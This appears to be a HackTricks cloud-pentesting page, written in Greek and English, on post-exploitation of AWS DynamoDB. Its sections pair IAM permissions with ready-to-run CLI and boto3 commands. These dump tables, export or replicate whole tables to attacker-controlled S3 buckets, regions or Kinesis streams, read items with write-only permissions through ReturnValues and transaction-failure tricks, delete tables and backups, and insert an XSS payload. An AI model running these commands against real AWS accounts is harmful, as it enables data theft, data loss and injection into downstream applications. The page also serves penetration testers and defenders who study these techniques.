# AWS - DynamoDB Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## DynamoDB

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

Ένας επιτιθέμενος με αυτά τα δικαιώματα θα μπορεί να **ανακτήσει αντικείμενα από πίνακες με βάση το πρωτεύον κλειδί** (δεν μπορείτε απλώς να ζητήσετε όλα τα δεδομένα του πίνακα). Αυτό σημαίνει ότι πρέπει να γνωρίζετε τα πρωτεύοντα κλειδιά (μπορείτε να τα αποκτήσετε λαμβάνοντας τα μεταδεδομένα του πίνακα (`describe-table`). 

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Πιθανός αντίκτυπος:** Έμμεσο privesc μέσω εντοπισμού ευαίσθητων πληροφοριών στον πίνακα

### `dynamodb:GetItem`

**Παρόμοιο με τα προηγούμενα δικαιώματα** αυτό επιτρέπει σε έναν πιθανό επιτιθέμενο να διαβάσει τιμές από μόνο 1 πίνακα δεδομένων, δεδομένου του πρωτεύοντος κλειδιού της εγγραφής που θα ανακτήσει:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Με αυτήν την άδεια είναι επίσης δυνατό να χρησιμοποιηθεί η μέθοδος **`transact-get-items`** όπως:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potential Impact:** Έμμεση privesc με τον εντοπισμό ευαίσθητων πληροφοριών στον πίνακα

### `dynamodb:Query`

**Παρόμοιο με τα προηγούμενα δικαιώματα** αυτό επιτρέπει σε έναν πιθανό attacker να διαβάσει τιμές από μόνον 1 table δεδομένου του primary key της εγγραφής που θα ανακτήσει. Επιτρέπει τη χρήση ενός [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html), αλλά η μόνη σύγκριση που επιτρέπεται με το primary key (που πρέπει να εμφανιστεί) είναι "EQ", οπότε δεν μπορείτε να χρησιμοποιήσετε σύγκριση για να πάρετε ολόκληρη τη DB σε ένα request.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Πιθανός Αντίκτυπος:** Έμμεσο privesc μέσω εντοπισμού ευαίσθητων πληροφοριών στον πίνακα

### `dynamodb:Scan`

Μπορείτε να χρησιμοποιήσετε αυτή την άδεια για να **dump ολόκληρο τον πίνακα εύκολα**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Πιθανός Αντίκτυπος:** Έμμεση privesc μέσω εντοπισμού ευαίσθητων πληροφοριών στον πίνακα

### `dynamodb:PartiQLSelect`

Μπορείτε να χρησιμοποιήσετε αυτό το δικαίωμα για να **dump ολόκληρο τον πίνακα εύκολα**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Αυτό το δικαίωμα επιτρέπει επίσης την εκτέλεση του `batch-execute-statement`, όπως:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
αλλά πρέπει να καθορίσετε το primary key με μια τιμή, οπότε δεν είναι τόσο χρήσιμο.

**Potential Impact:** Έμμεση privesc από τον εντοπισμό ευαίσθητων πληροφοριών στον πίνακα

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Αυτή η άδεια θα επιτρέψει σε έναν επιτιθέμενο να **εξάγει ολόκληρο τον πίνακα σε ένα S3 bucket** της επιλογής του:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Σημειώστε ότι για να λειτουργήσει αυτό ο πίνακας πρέπει να έχει ενεργοποιημένο το point-in-time-recovery. Μπορείτε να ελέγξετε αν ο πίνακας το έχει με:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Αν δεν είναι ενεργοποιημένο, θα χρειαστεί να το **ενεργοποιήσετε** και γι' αυτό χρειάζεστε την άδεια **`dynamodb:ExportTableToPointInTime`**:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potential Impact:** Έμμεση privesc μέσω εντοπισμού ευαίσθητων πληροφοριών στον πίνακα

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Με αυτά τα δικαιώματα, ένας attacker θα μπορούσε να **δημιουργήσει έναν νέο πίνακα από ένα backup** (ή ακόμη και να δημιουργήσει ένα backup για να το επαναφέρει σε διαφορετικό πίνακα). Έπειτα, με τα απαραίτητα δικαιώματα, θα μπορούσε να ελέγξει **πληροφορίες** από τα backups που c**δεν υπάρχουν πλέον στον production** πίνακα.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Πιθανός Αντίκτυπος:** Έμμεση privesc μέσω εντοπισμού ευαίσθητων πληροφοριών στο αντίγραφο ασφαλείας του πίνακα

### `dynamodb:PutItem`

Αυτό το δικαίωμα επιτρέπει στους χρήστες να προσθέσουν ένα νέο item στον πίνακα ή να αντικαταστήσουν ένα υπάρχον item με ένα νέο item. Εάν υπάρχει ήδη item με το ίδιο primary key, το **ολόκληρο item θα αντικατασταθεί** με το νέο item. Εάν το primary key δεν υπάρχει, ένα νέο item με το καθορισμένο primary key θα **δημιουργηθεί**.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Πιθανός Αντίκτυπος:** Exploitation of further vulnerabilities/bypasses, έχοντας τη δυνατότητα να προσθέτετε/τροποποιείτε δεδομένα σε έναν πίνακα DynamoDB

### `dynamodb:UpdateItem`

Αυτή η άδεια επιτρέπει στους χρήστες να **τροποποιούν τα υπάρχοντα attributes ενός στοιχείου ή να προσθέτουν νέα attributes σε ένα στοιχείο**. Δεν **αντικαθιστά** ολόκληρο το στοιχείο· ενημερώνει μόνο τα συγκεκριμένα attributes. Εάν το πρωτεύον κλειδί δεν υπάρχει στον πίνακα, η ενέργεια θα **δημιουργήσει ένα νέο στοιχείο** με το καθορισμένο πρωτεύον κλειδί και θα ορίσει τα attributes που καθορίζονται στην έκφραση ενημέρωσης.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Πιθανή Επίπτωση:** Εκμετάλλευση επιπλέον vulnerabilities/bypasses μέσω της δυνατότητας προσθήκης/τροποποίησης δεδομένων σε έναν πίνακα DynamoDB

### `dynamodb:DeleteTable`

Ένας επιτιθέμενος με αυτήν την άδεια μπορεί να **διαγράψει έναν πίνακα DynamoDB, προκαλώντας απώλεια δεδομένων**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potential impact**: Απώλεια δεδομένων και διακοπή υπηρεσιών που βασίζονται στον διαγραμμένο πίνακα.

### `dynamodb:DeleteBackup`

Ένας επιτιθέμενος με αυτή την άδεια μπορεί να **διαγράψει ένα backup του DynamoDB, προκαλώντας ενδεχομένως απώλεια δεδομένων σε περίπτωση σεναρίου ανάκαμψης από καταστροφή**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Πιθανός αντίκτυπος**: Απώλεια δεδομένων και αδυναμία ανάκτησης από αντίγραφο ασφαλείας σε σενάριο ανάκαμψης από καταστροφή.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Ελέγξτε αν αυτό λειτουργεί πραγματικά

Ένας attacker με αυτά τα permissions μπορεί να **enable a stream σε έναν DynamoDB table, update τον πίνακα για να ξεκινήσει το streaming των αλλαγών, και στη συνέχεια να έχει access στο stream για να παρακολουθεί τις αλλαγές στον πίνακα σε πραγματικό χρόνο**. Αυτό επιτρέπει στον attacker να παρακολουθεί και να exfiltrate αλλαγές δεδομένων, ενδεχομένως οδηγώντας σε data leakage.

1. Enable a stream on a DynamoDB table:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. Περιγράψτε το stream για να λάβετε το ARN και άλλες λεπτομέρειες:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Λάβετε τον shard iterator χρησιμοποιώντας το stream ARN:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. Χρησιμοποιήστε το shard iterator για να αποκτήσετε πρόσβαση και να exfiltrate δεδομένα από το stream:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Πιθανός αντίκτυπος**: Παρακολούθηση σε πραγματικό χρόνο και data leakage των αλλαγών του πίνακα DynamoDB.

### Ανάγνωση items μέσω `dynamodb:UpdateItem` and `ReturnValues=ALL_OLD`

Ένας attacker με μόνο `dynamodb:UpdateItem` σε έναν πίνακα μπορεί να διαβάσει items χωρίς κανένα από τα συνήθη read permissions (`GetItem`/`Query`/`Scan`) εκτελώντας μια ακίνδυνη ενημέρωση και ζητώντας `--return-values ALL_OLD`. Το DynamoDB θα επιστρέψει την πλήρη προ-ενημέρωσης εικόνα του item στο πεδίο `Attributes` της απάντησης (αυτό δεν καταναλώνει RCUs).

- Ελάχιστα δικαιώματα: `dynamodb:UpdateItem` στον στοχευμένο table/key.
- Προαπαιτούμενα: Πρέπει να γνωρίζετε το πρωτεύον κλειδί του item.

Παράδειγμα (προσθέτει ένα ακίνδυνο attribute και exfiltrates το προηγούμενο item στην απάντηση):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
Η απόκριση του CLI θα περιλαμβάνει ένα μπλοκ `Attributes` που περιέχει το πλήρες προηγούμενο αντικείμενο (όλα τα attributes), παρέχοντας ουσιαστικά ένα read primitive από write-only access.

**Πιθανός Αντίκτυπος:** Read arbitrary items from a table with only write permissions, enabling sensitive data exfiltration when primary keys are known.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Κρυφή exfiltration με την προσθήκη μιας νέας replica Region σε ένα DynamoDB Global Table (version 2019.11.21). Αν ένας principal μπορεί να προσθέσει έναν regional replica, ολόκληρος ο πίνακας αναπαράγεται στην attacker-chosen Region, από την οποία ο attacker μπορεί να διαβάσει όλα τα items.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

Δικαιώματα: `dynamodb:UpdateTable` (with `replica-updates`) ή `dynamodb:CreateTableReplica` στον στοχευόμενο πίνακα. Εάν χρησιμοποιείται CMK στο replica, μπορεί να απαιτούνται δικαιώματα KMS για αυτό το key.

Πιθανός αντίκτυπος: Full-table replication σε attacker-controlled Region που οδηγεί σε stealthy data exfiltration.

### `dynamodb:TransactWriteItems` (ανάγνωση μέσω αποτυχημένης συνθήκης + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

Ένας attacker με δικαιώματα transactional write μπορεί να exfiltrate τα πλήρη attributes ενός υπάρχοντος item εκτελώντας ένα `Update` μέσα σε `TransactWriteItems` που αποτυγχάνει σκόπιμα ένα `ConditionExpression` ενώ ορίζει `ReturnValuesOnConditionCheckFailure=ALL_OLD`. Σε περίπτωση αποτυχίας, το DynamoDB συμπεριλαμβάνει τα προηγούμενα attributes στους λόγους ακύρωσης της transaction, μετατρέποντας ουσιαστικά την πρόσβαση μόνο για εγγραφή σε read access των στοχευμένων keys.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

Permissions: `dynamodb:TransactWriteItems` on the target table (and the underlying item). No read permissions are required.

Potential Impact: Read arbitrary items (by primary key) from a table using only transactional write privileges via the returned cancellation reasons.

Πιθανός Αντίκτυπος: Ανάγνωση αυθαίρετων αντικειμένων (με βάση το πρωτεύον κλειδί) από έναν πίνακα χρησιμοποιώντας μόνο δικαιώματα εγγραφής συναλλαγής μέσω των επιστρεφόμενων λόγων ακύρωσης.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` on GSI

Παρακάμψτε τους περιορισμούς ανάγνωσης δημιουργώντας ένα Global Secondary Index (GSI) με `ProjectionType=ALL` σε ένα πεδίο χαμηλής εντροπίας, ορίστε αυτό το πεδίο σε μια σταθερή τιμή για όλα τα αντικείμενα, και στη συνέχεια κάντε `Query` στο index για να ανακτήσετε τα πλήρη αντικείμενα. Αυτό λειτουργεί ακόμη και αν το `Query`/`Scan` στον βασικό πίνακα απορρίπτεται, αρκεί να μπορείτε να κάνετε query στο index ARN.

- Minimum permissions:
- `dynamodb:UpdateTable` on the target table (to create the GSI with `ProjectionType=ALL`).
- `dynamodb:UpdateItem` on the target table keys (to set the indexed attribute on each item).
- `dynamodb:Query` on the index resource ARN (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Steps (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Πιθανός Αντίκτυπος:** Full table exfiltration by querying a newly created GSI that projects all attributes, even when base table read APIs are denied.


### `dynamodb:EnableKinesisStreamingDestination` (Συνεχής exfiltration via Kinesis Data Streams)

Κατάχρηση των DynamoDB Kinesis streaming destinations για να exfiltrate συνεχώς τις αλλαγές από έναν πίνακα σε ένα attacker-controlled Kinesis Data Stream. Μόλις ενεργοποιηθεί, every INSERT/MODIFY/REMOVE event προωθείται near real-time στο stream χωρίς να απαιτούνται read permissions στον πίνακα.

Minimum permissions (attacker):
- `dynamodb:EnableKinesisStreamingDestination` on the target table
- Optionally `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` to monitor status
- Read permissions on the attacker-owned Kinesis stream to consume records: `kinesis:ListShards`, `kinesis:GetShardIterator`, `kinesis:GetRecords`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
</details>

**Potential Impact:** Συνεχής, σχεδόν σε πραγματικό χρόνο exfiltration των αλλαγών στον πίνακα σε ένα attacker-controlled Kinesis stream χωρίς άμεσες λειτουργίες ανάγνωσης στον πίνακα.



{{#include ../../../banners/hacktricks-training.md}}
